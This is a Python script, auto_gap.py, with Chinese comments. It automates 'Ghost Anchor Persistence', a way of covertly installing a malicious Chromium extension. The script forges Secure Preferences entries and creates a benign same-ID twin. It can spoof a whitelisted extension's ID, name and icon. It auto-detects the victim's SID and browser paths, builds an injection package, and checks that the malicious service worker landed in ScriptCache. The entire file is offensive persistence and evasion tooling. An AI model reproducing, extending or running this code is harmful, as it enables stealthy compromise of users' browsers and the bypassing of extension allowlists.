#!/usr/bin/env python3
"""
auto_gap.py - 一键 GAP (Ghost Anchor Persistence) 工具（本机直跑版）

两种用法：
【方式一】本机自动化（推荐）：
   python auto_gap.py --malicious C:/path/to/my_extension
   python auto_gap.py --malicious C:/path/to/my_extension --spoof <白名单ID> --apply
   会自动探测 SID / Secure Preferences / 部署目录；--apply 直接在本机跑完整注入链，
   并在最后自动校验恶意代码是否真的写进了 ScriptCache。

【方式二】离线打包：
   用显式参数生成 _deploy.zip，拷到目标机解压运行 inject.bat。
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")

from utils.browser_config import BrowserConfigurator
from utils.gap_package import gap_package, resolve_shared_key
from utils import verify, autodetect


def _empty_js(src_dir, dst_dir):
    shutil.copytree(src_dir, dst_dir, dirs_exist_ok=True)
    for root, _, files in os.walk(dst_dir):
        for f in files:
            if f.lower().endswith(".js"):
                with open(os.path.join(root, f), "w", encoding="utf-8") as fh:
                    fh.write("")



def sanitize_name(name):
    name = str(name or "").strip()
    name = re.sub(r"[^A-Za-z0-9._ -]", "_", name)
    name = name.replace(" ", "_")
    return name or "extension"


def already_installed(prefs_file, crx_id, deploy_path, target_dir):
    """判断目标是否已安装该扩展：按 ID(且在目标目录下) 或按部署路径匹配。"""
    try:
        with open(prefs_file, encoding="utf-8") as f:
            data = json.load(f)
    except Exception:
        return False
    settings = data.get("extensions", {}).get("settings", {}) or {}
    target = os.path.normpath(target_dir).lower()
    ld = os.path.normpath(deploy_path).lower()

    # 按 ID：该 ID 已有记录，且路径落在我们部署目录下。只有当文件夹真实存在才算已装；
    # 若已被删除/卸载（磁盘上没有文件夹），应允许重新安装（而不用 --force）。
    if crx_id and crx_id in settings:
        p = settings[crx_id].get("path") or ""
        if p and os.path.normpath(p).lower().startswith(target + os.sep) and os.path.isdir(p):
            return True
    # 按路径：任何一条记录的路径就是我们这次要部署的文件夹，且文件夹必须真实存在
    for eid, entry in settings.items():
        p = entry.get("path") or ""
        if p and os.path.normpath(p).lower() == ld and os.path.isdir(p):
            return True
    return False


def build_benign_twin(malicious_dir, benign_dir):
    _empty_js(malicious_dir, benign_dir)
    print(f"[+] 自动生成良性孪生扩展 B（同 ID，空 JS）: {benign_dir}")


def apply_local(zip_path, browser, prefs_file, malicious_dir):
    """在本机直接执行注入，并在结束后自动校验 GAP 是否真正生效。"""
    import zipfile

    sw_file = "background.js"
    try:
        with open(os.path.join(malicious_dir, "manifest.json"), encoding="utf-8") as f:
            m = json.load(f)
        sw_file = (m.get("background") or {}).get("service_worker") or sw_file
    except Exception:
        pass
    a_bg = os.path.join(malicious_dir, sw_file)

    tmp = tempfile.mkdtemp(prefix="gap_apply_")
    print(f"[*] 正在本机直接执行注入链 ... ({tmp})")
    with zipfile.ZipFile(zip_path) as z:
        z.extractall(tmp)
    plat = autodetect.detect_platform_name()
    if plat == "windows":
        script = os.path.join(tmp, "inject.bat")
        cmd = [script]
    else:
        script = os.path.join(tmp, "inject.sh")
        os.chmod(script, 0o755)
        cmd = ["sh", script]
    print("[*] 运行:", " ".join(cmd))
    r = subprocess.run(cmd, cwd=tmp)
    shutil.rmtree(tmp, ignore_errors=True)
    if r.returncode != 0:
        print("[-] apply 执行返回非零, 请查看上面输出。")
        sys.exit(r.returncode)

    print("\n" + "#" * 62)
    print("#  开始自动校验：恶意代码有没有真正写进 Service Worker\\ScriptCache")
    print("#" * 62)
    verify.verify(prefs_file, a_bg)


def main():
    parser = argparse.ArgumentParser(
        description="auto_gap.py - 一键 GAP 工具（本机自动探测 / 离线打包）",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--malicious", required=True,
                        help="你的恶意扩展文件夹 (A)，必须含 manifest.json")
    parser.add_argument("--benign", default=None,
                        help="(可选) 已有良性扩展 B；默认由 A 自动生成")
    parser.add_argument("--spoof", metavar="EXTENSION_ID", default=None,
                        help="要伪装的白名单扩展 ID（名字/描述/图标也会一起套用）")
    parser.add_argument("--key", metavar="PEM|B64", default=None,
                        help="固定扩展 key（自定义稳定 ID）：PEM 私钥文件路径 / base64 私钥 / 已有公钥，与 --spoof 二选一")
    parser.add_argument("--stable-key", metavar="PATH", nargs="?", const="_default_", default=None,
                        help="固定钥匙文件：首次自动生成并保存到本地，之后每次复用，得到稳定 ID；默认保存在脚本目录 gap_stable_key.json，与 --spoof/--key 三选一")

    parser.add_argument("--prefs-file", default=None,
                        help="目标机 Secure Preferences 路径（默认：本机自动探测）")
    parser.add_argument("--device-id", default=None,
                        help="目标用户 SID 或 UUID（默认：本机自动探测 whoami /user）")
    parser.add_argument("--target-dir", default=None,
                        help="部署根目录（默认：本机自动探测 LOCALAPPDATA 环境变量）")

    parser.add_argument("--platform", default=None,
                        choices=["windows", "linux", "darwin"],
                        help="目标系统（默认：本机自动探测）")
    parser.add_argument("--browser", default=None,
                        choices=list(BrowserConfigurator.get_browser_configs().keys()),
                        help="目标浏览器（默认：本机自动探测已安装者）")
    parser.add_argument("--proxy", default=None,
                        help="spoof 时用的 HTTP 代理")
    parser.add_argument("--output", default=None,
                        help="输出目录 (默认当前目录)")
    parser.add_argument("--apply", action="store_true",
                        help="(可选) 打包后直接在本机执行完整注入链并校验")
    parser.add_argument("--folder-name", default=None,
                        help="磁盘上的文件夹名；默认 --spoof 时用白名单扩展名，否则用 A 的当前名")
    parser.add_argument("--force", action="store_true",
                        help="即使检测到已安装也强制重装")
    parser.add_argument("--keep-benign", action="store_true",
                        help="保留自动生成的良性 B")
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()
    sel = [x for x in (args.spoof, args.key, args.stable_key) if x]
    if len(sel) > 1:
        print("[-] --spoof / --key / --stable-key 只能三选一，请去掉多余的。"); sys.exit(1)

    print("=" * 62)
    print("  auto_gap.py - 一键 Ghost Anchor Persistence")
    print("=" * 62)

    if not os.path.isdir(args.malicious):
        print("[-] 恶意扩展文件夹不存在:", args.malicious); sys.exit(1)
    if not os.path.exists(os.path.join(args.malicious, "manifest.json")):
        print("[-] 未找到 manifest.json (请确认是 MV3 带 background service_worker 的扩展)")
        sys.exit(1)

    platform_name = args.platform or autodetect.detect_platform_name()
    print(f"\n[*] 平台: {platform_name}")

    browser = args.browser
    if browser is None:
        browser = autodetect.auto_browser(platform_name)
        if not browser and args.prefs_file:
            lp = args.prefs_file.lower().replace("\\", "/")
            for k, token in (("edge", "edge"), ("chrome", "chrome"),
                             ("brave", "brave"), ("vivaldi", "vivaldi")):
                if token in lp:
                    browser = k
                    break
        if not browser:
            print("[-] 未在本机探测到已安装的 Chromium 浏览器，请用 --browser 指定。")
            sys.exit(1)
        print(f"[*] 浏览器: {browser}（自动探测/推断）")

    device_id = args.device_id or autodetect.detect_device_id(platform_name)
    if not device_id:
        print("[-] 无法自动获取 SID/UUID，请用 --device-id 显式指定。"); sys.exit(1)
    if args.device_id is None:
        print(f"[*] 自动获取 device-id: {device_id}")

    target_dir = args.target_dir or autodetect.detect_target_dir(platform_name)
    if not target_dir:
        print("[-] 无法自动获取部署根目录，请用 --target-dir 显式指定。"); sys.exit(1)
    if args.target_dir is None:
        print(f"[*] 自动获取 target-dir: {target_dir}")

    prefs_file = args.prefs_file
    if prefs_file is None:
        prefs_file = autodetect.detect_prefs_file(platform_name, browser)[0]
    if not prefs_file or not os.path.exists(prefs_file):
        print("[-] 找不到 Secure Preferences，请用 --prefs-file 显式指定。")
        sys.exit(1)
    if args.prefs_file is None:
        print(f"[*] 自动定位 Secure Preferences: {prefs_file}")

    benign = args.benign
    tmp_cleanup = None
    if benign is None:
        tmp = tempfile.mkdtemp(prefix="gap_benign_")
        tmp_cleanup = tmp
        # 用 A 的文件夹名作为 B 的部署名，让“加载来源”路径看起来自然（不再是 extension_benign）
        nat_name = os.path.basename(os.path.normpath(args.malicious)) or "extension"
        import re as _re
        nat_name = _re.sub(r"[^A-Za-z0-9._-]", "_", nat_name)
        benign = os.path.join(tmp, nat_name)
        build_benign_twin(args.malicious, benign)

    print("\n[1/3] 解析并统一 A、B 的扩展 ID ...")
    fixed_key = None
    if args.key:
        from utils.crypto import resolve_fixed_key
        try:
            fixed_key, fixed_id = resolve_fixed_key(args.key)
            print(f"[*] 使用固定 key -> 自定义稳定 ID: {fixed_id}")
        except Exception as e:
            print(f"[-] --key 解析失败: {e}"); sys.exit(1)
    elif args.stable_key:
        from utils.crypto import load_or_create_stable_key
        if args.stable_key == "_default_":
            args.stable_key = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gap_stable_key.json")
        try:
            fixed_key, fixed_id = load_or_create_stable_key(args.stable_key)
            print(f"[*] 使用稳定钥匙 -> 固定 ID: {fixed_id}")
        except Exception as e:
            print(f"[-] --stable-key 解析失败: {e}"); sys.exit(1)
    else:
        # 默认：若已内置默认公钥（SecurityShield），直接用，免带私钥/钥匙文件
        from utils.crypto import DEFAULT_PUBLIC_KEY as _DPK
        if _DPK:
            from utils.manifest import key_to_crx_id
            import base64 as _b64
            fixed_key = _DPK
            fixed_id = key_to_crx_id(_b64.b64decode(_DPK))
            print(f"[*] 使用内置默认公钥 -> 固定 ID: {fixed_id}（无需私钥）")

    crx_id, pub_key = resolve_shared_key(
        malicious_dir=args.malicious,
        benign_dir=benign,
        spoof_id=args.spoof,
        browser=browser,
        proxy=args.proxy,
        fixed_key=fixed_key,
    )
    if not crx_id:
        print("[-] 无法获得共享的扩展 ID，已中止。"); sys.exit(1)

    print("\n[2/3] 生成 Secure Preferences (A 恶意 / B 良性) 并打包 ...")
    # 确定磁盘文件夹名：优先 --folder-name，否则 --spoof 用白名单扩展名，否则用 A 名
    folder_name = None
    if args.folder_name:
        folder_name = sanitize_name(args.folder_name)
    elif args.spoof:
        try:
            with open(os.path.join(args.malicious, "manifest.json"), encoding="utf-8") as f:
                folder_name = sanitize_name(json.load(f).get("name"))
        except Exception:
            pass
        if folder_name:
            print(f"[*] 使用白名单扩展名作为磁盘文件夹名: {folder_name}")

    # 防重复安装：已安装则跳过（--force 可强制重装）
    persist_name = folder_name or sanitize_name(os.path.basename(os.path.normpath(args.malicious)))
    deploy_path = os.path.join(target_dir, persist_name)
    if not args.force and already_installed(prefs_file, crx_id, deploy_path, target_dir):
        print(f"[*] 检测到该扩展已安装于: {deploy_path}")
        print("[*] 已跳过，不再重复执行（加 --force 可强制重装）")
        if tmp_cleanup and not args.keep_benign:
            shutil.rmtree(tmp_cleanup, ignore_errors=True)
        return

    result = gap_package(
        malicious_dir=args.malicious,
        benign_dir=benign,
        crx_id=crx_id,
        prefs_file=prefs_file,
        device_id=device_id,
        target_dir=target_dir,
        browser_id=browser,
        platform=platform_name,
        output_dir=args.output,
        debug=args.debug,
        folder_name=folder_name,
    )
    if not result:
        print("\n[-] 打包失败。"); sys.exit(1)

        print("\n[3/3] 完成。")
    print("[*] 部署包:", result)
    print("[*] 共享扩展 ID:", crx_id)

    if args.keep_benign and benign != args.benign:
        keep = os.path.join(args.output or ".", "extension_benign_generated")
        shutil.rmtree(keep, ignore_errors=True)
        shutil.copytree(benign, keep)
        print("[*] 已保留生成的良性 B 到:", keep)

    if args.apply:
        apply_local(result, browser, prefs_file, args.malicious)

    if tmp_cleanup and not args.keep_benign:
        shutil.rmtree(tmp_cleanup, ignore_errors=True)


if __name__ == "__main__":
    main()


